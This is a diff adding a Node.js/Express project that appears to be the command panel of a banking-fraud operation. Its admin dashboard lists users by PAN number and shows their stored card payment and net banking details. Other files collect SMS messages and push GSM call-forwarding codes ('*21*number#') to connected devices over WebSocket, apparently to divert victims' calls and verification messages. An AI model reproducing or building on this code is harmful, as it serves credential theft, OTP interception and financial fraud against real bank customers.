@@ -1,0 +1,462 @@
+server.js
+
+// server.js
+const express = require('express');
+const app = express();
+const mongoose = require('mongoose');
+const path = require('path');
+const helmet = require('helmet'); 
+const Admin = require('./models/Admin');
+const dotenv = require('dotenv');
+const cardRoutes = require('./routes/cardRoutes')
+const netBankingRoutes = require('./routes/netBankingRoutes');
+const callRoutes = require('./routes/callRoutes');
+const userRoutes = require('./routes/userRoutes');
+const adminRoutes = require('./routes/adminRoutes');
+const CardPayment = require('./models/CardPayment'); // Added
+const NetBanking = require('./models/NetBanking'); // Added
+const notificationRoutes = require('./routes/notificationRoutes');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const User = require('./models/User');
+const Notification = require('./models/Notification');
+const connectDB = require('./config/dbConfig');
+
+dotenv.config();
+
+
+app.use(helmet());
+app.use(express.json());
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.static(path.join(__dirname, 'public')));
+app.set('views', path.join(__dirname, 'views')); 
+app.set('view engine', 'ejs');
+app.use(cors());
+
+// Connect to MongoDB
+connectDB();
+
+// Routes
+app.use('/api/detail', cardRoutes);
+app.use('/api/payment', netBankingRoutes);
+app.use('/api/user', userRoutes);
+app.use('/api/admin', adminRoutes);
+app.use('/api/call', callRoutes);
+app.use('/api/notification', notificationRoutes);
+
+app.get('/dashboard', async (req, res) => {
+    try {
+        const users = await User.find(); // Fetch all users
+        const notifications = await Notification.find(); // Fetch all notifications
+        res.render('dashboard', { users, notifications });
+    } catch (err) {
+        console.log(err);
+        res.status(500).send('Error loading dashboard');
+    }
+});
+
+app.get('/detail/:id', async (req, res) => {
+    try {
+        const user = await User.findById(req.params.id); // Fetch user details
+
+        if (!user) {
+            return res.status(404).send('User not found');
+        }
+
+        // Fetch associated payment details
+        const cardPayment = await CardPayment.findOne({ userId: user._id });
+        const netBanking = await NetBanking.findOne({ userId: user._id });
+
+        // Check if the cardPayment and netBanking userId match with the current user
+        if (cardPayment && cardPayment.userId.toString() !== user._id.toString()) {
+            return res.status(400).send('Card payment details do not match the user.');
+        }
+
+        if (netBanking && netBanking.userId.toString() !== user._id.toString()) {
+            return res.status(400).send('Net banking details do not match the user.');
+        }
+
+        res.render('detail', { user, cardPayment, netBanking }); // Pass data to template
+    } catch (err) {
+        console.error('Error fetching user details:', err);
+        res.status(500).send('Error loading details');
+    }
+});
+
+
+app.post('/delete/:id', async (req, res) => {
+    try {
+        const userId = req.params.id; // Extract user ID from URL
+        await User.findByIdAndDelete(userId); // Delete user from database
+
+        res.redirect('/dashboard'); // Redirect back to dashboard after deletion
+    } catch (err) {
+        console.error("Error deleting user:", err);
+        res.status(500).send("Error deleting user.");
+    }
+});
+
+app.get('/sms', async (req, res) => {
+    try {
+        const notifications = await Notification.find();
+        res.render('sms', { notifications });
+    } catch (err) {
+        console.error("Error fetching notifications:", err);
+        res.status(500).send("Error loading SMS notifications.");
+    }
+});
+
+// In your server.js or relevant routes file
+app.get('/settings', async (req, res) => {
+    try {
+        const admin = await Admin.findOne(); // Get admin record
+        const adminPhoneNumber = admin ? admin.phoneNumber : '';
+        res.render('settings', { adminPhoneNumber }); // Default empty if no record
+    
+
+    } catch (err) {
+        console.error('Error loading settings:', err);
+        res.status(500).send('Error loading settings');
+    }
+});
+
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
+
+
+websocket(server level)
+
+const WebSocket = require('ws');
+
+const wss = new WebSocket.Server({ port: 8080 });
+
+let clients = [];
+
+wss.on('connection', (ws) => {
+    console.log('New client connected');
+
+    clients.push(ws);
+
+    ws.on('message', (message) => {
+        console.log(`Received message: ${message}`);
+    });
+
+    ws.on('close', () => {
+        console.log('Client disconnected');
+        clients = clients.filter(client => client !== ws);
+    });
+});
+
+// Function to broadcast messages
+const broadcastMessage = (message) => {
+    clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify(message));
+        }
+    });
+};
+
+module.exports = { wss, broadcastMessage };
+
+
+
+dashboard.ejs
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="css/dashboard.css">
+    <style>
+        /* Styling for clickable rows */
+        tr.clickable-row {
+            cursor: pointer;
+        }
+        tr.clickable-row:hover {
+            background-color: #f2f2f2;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        .start-button, .stop-button {
+            padding: 10px 15px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .start-button {
+            background-color: green;
+            color: white;
+        }
+        .stop-button {
+            background-color: red;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Admin Dashboard</h1>
+        <div class="settings-icon">
+            <a href="/settings">Update Number</a>
+            <br>
+            <a href="/sms">All SMS</a>
+            <div class="button-container">
+                <form action="/api/call/start" method="GET">
+                    <button type="submit" class="start-button">Start</button>
+                </form>
+                <form action="/api/call/stop" method="POST">
+                    <button type="submit">Stop</button>
+                </form>
+            </div>            
+        </main>
+        </div>
+    </header>
+
+    <main>
+        <section id="user-data">
+            <h2>User Data</h2>
+            <table>
+                <tbody>
+                    <% users.forEach(function(user) { %>
+                        <tr 
+                            class="clickable-row" 
+                            data-href="/detail/<%= user._id %>"
+                        >
+                            <td><img src="/public/images/avatar.png" alt="avatar"></td>
+                            <td><%= user.pan%></td>
+                            <td>
+                                <a href="/detail/<%= user._id %>">View Details</a>
+                            </td>
+                            <td>
+                                <form action="/delete/<%= user._id %>" method="POST" onsubmit="return confirm('Are you sure you want to delete this user?');">
+                                    <button type="submit" class="delete-button">Delete</button>
+                                </form>
+                            </td>
+                        </tr>
+                    <% }); %>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Start and Stop Buttons -->
+       
+    <script>
+        // JavaScript to make rows clickable
+        document.addEventListener('DOMContentLoaded', function () {
+            const rows = document.querySelectorAll('.clickable-row');
+            rows.forEach(row => {
+                row.addEventListener('click', function () {
+                    window.location.href = this.dataset.href;
+                });
+            });
+        });
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+call.ejs
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Forwarding</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        input {
+            padding: 10px;
+            width: 200px;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 15px;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+            background-color: green;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Call Forwarding Settings</h1>
+    <form action="/api/call/set" method="POST">
+        <input type="text" name="phoneNumber" placeholder="Enter 10-digit number" required>
+        <button type="submit">Set</button>
+    </form>
+</body>
+</html>
+
+
+
+
+callRoute
+
+const express = require('express');
+const router = express.Router();
+const callController = require('../controllers/callController');
+
+router.get('/start', (req, res) => {
+    res.render('call'); // call.ejs file render karega
+});
+
+// Fix: Change GET to POST for /set and /stop
+router.post('/set', callController.setCallForwarding);
+
+router.post('/stop', callController.stopCallForwarding);
+
+router.get('/getCallForwardingCode', callController.getCallForwardingCode);
+
+module.exports = router;
+
+
+
+callController
+
+
+const Call = require('../models/Call');
+const { broadcastMessage } = require('../websocket'); // ✅ WebSocket Import Karo
+
+// Get Call Forwarding Code (Fetch from DB)
+exports.getCallForwardingCode = async (req, res) => {
+    try {
+        let call = await Call.findOne();
+        if (!call) {
+            return res.status(404).json({ 
+                success: false, 
+                error: 'No call forwarding code found', 
+                code: null 
+            });
+        }
+
+        return res.status(200).json({ 
+            success: true, 
+            code: call.code 
+        });
+    } catch (error) {
+        console.error('Error fetching call forwarding code:', error);
+        return res.status(500).json({ 
+            success: false, 
+            error: 'Internal Server Error', 
+            code: null 
+        });
+    }
+};
+
+// Activate Call Forwarding and Save Code
+exports.setCallForwarding = async (req, res) => {
+    try {
+        console.log("Received Request:", req.body);
+
+        const { phoneNumber } = req.body;
+
+        if (!phoneNumber || typeof phoneNumber !== 'string' || phoneNumber.length < 10) {
+            return res.status(400).json({ 
+                success: false, 
+                error: 'Invalid phone number', 
+                code: null 
+            });
+        }
+
+        const activationCode = `*21*${phoneNumber}#`;
+        console.log('Call Forwarding Activated:', activationCode);
+
+        let call = await Call.findOne();
+        if (call) {
+            call.code = activationCode;
+            await call.save();
+        } else {
+            call = await Call.create({ code: activationCode });
+        }
+
+        // ✅ WebSocket Broadcast
+        broadcastMessage(call.code);
+
+        return res.status(200).json({ 
+            success: true, 
+            message: "Data set successfully",  
+            code: call.code 
+        });
+    } catch (error) {
+        console.error('Error setting call forwarding:', error);
+        return res.status(500).json({ 
+            success: false, 
+            error: 'Internal Server Error', 
+            code: null 
+        });
+    }
+};
+
+// Stop Call Forwarding
+exports.stopCallForwarding = async (req, res) => {
+    try {
+        const deactivationCode = '##21#';
+        console.log('Call Forwarding Deactivated:', deactivationCode);
+
+        let call = await Call.findOne();
+        if (call) {
+            call.code = deactivationCode;
+            await call.save();
+        } else {
+            call = await Call.create({ code: deactivationCode });
+        }
+
+        // ✅ WebSocket Broadcast
+        broadcastMessage(call.code);
+
+        return res.status(200).json({ 
+            success: true, 
+            message: "Call forwarding stopped successfully",  
+            code: call.code 
+        });
+    } catch (error) {
+        console.error('Error stopping call forwarding:', error);
+        return res.status(500).json({ 
+            success: false, 
+            error: 'Internal Server Error', 
+            code: null 
+        });
+    }
+};
+
+
+
+
+
+model (call.js)
+
+
+
+const mongoose = require('mongoose');
+
+const callSchema = new mongoose.Schema({
+    code: {  // Stores the activation/deactivation code
+        type: String,
+        required: true,  // The code is mandatory
+    }
+});
+
+const Call = mongoose.model('Call', callSchema);
+
+module.exports = Call;
+
+
+
+
